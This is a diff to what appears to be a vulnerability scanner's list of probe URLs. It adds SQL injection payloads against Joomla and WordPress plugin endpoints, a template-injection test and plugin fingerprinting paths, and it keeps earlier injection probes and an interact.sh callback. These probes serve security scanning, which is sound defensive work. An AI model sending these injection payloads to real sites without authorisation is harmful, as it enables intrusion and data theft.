@@ -840,3 +840,11 @@
 /wp-json/h5vp/v1/video/0?id=
 /index.php?option=com_easystore&view=products&task=search&filter_sortby=created-ASC,EXTRACTVALUE(1,CONCAT(CHAR(126),SUBSTRING(MD5({{num}}),1,28)))--+-
 /webmail/basic/?referer=https://interact.sh&_c=auth&ctz=120&signup_password=&_a%5bsignup%5d=1
+/wp-content/plugins/quick-playground/readme.txt
+/wp-content/{{filename}}
+{{pagepath}}cfsPreFill=1&first_name=%7B%7B{{num1}}*{{num2}}%7D%7D
+/api/v1/repos/search?limit=1
+/index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=1&type_id=1&list[select]=updatexml(0x23,concat(1,md5({{num}})),1)
+/wp-content/plugins/wp-fastest-cache/readme.txt
+/wp-json/vsfw/v1/videos?fields=%28SELECT%20424242*2%29%20as%20id
+/wp-content/themes/xstore/style.css
